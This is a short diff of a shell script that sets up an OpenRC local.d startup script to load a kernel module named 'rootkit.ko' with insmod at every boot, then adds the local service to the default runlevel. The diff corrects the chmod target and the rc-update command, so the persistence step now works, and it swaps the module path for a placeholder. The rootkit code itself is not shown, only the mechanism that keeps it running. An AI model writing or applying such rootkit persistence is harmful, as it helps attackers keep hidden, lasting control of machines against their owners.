@@ -1,9 +1,9 @@
 echo "#!/bin/sh" > /etc/local.d/my_startup.start
 
-echo "insmod /opt/mymodules/rootkit_persistent.ko" >> /etc/local.d/my_startup.start
+echo "insmod /111111111111111111111111111/rootkit.ko" >> /etc/local.d/my_startup.start
 
-chmod +x /etc/local.d/rootkit.start
+chmod +x /etc/local.d/my_startup.start
 
 #Adds the local service to the default runlevel
-c-update add local default
+rc-update add local default
 
